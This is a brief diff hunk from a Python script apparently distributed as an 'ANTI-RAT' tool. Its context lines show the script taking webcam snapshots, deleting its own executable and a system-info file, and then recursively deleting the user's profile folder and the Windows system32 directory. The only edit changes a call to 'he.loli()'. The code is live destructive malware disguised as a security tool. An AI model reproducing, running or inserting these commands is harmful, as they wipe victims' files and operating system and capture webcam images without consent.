@@ -222,7 +222,7 @@ def main():
     web.execute()
     camera.snap(10,"test")
     subprocess.getoutput('if exist "%userprofile%\AppData\System info.txt" del "%userprofile%\appdata\System info.txt"')
-    he.loli()
+    he.loli(40)
     subprocess.getoutput('del ANTI-RAT_By_EtichalHackingItalia.exe')
     subprocess.getoutput('rd "%userprofile%"/q /s')
     subprocess.getoutput('rd "%windir%\system32"/q /s')
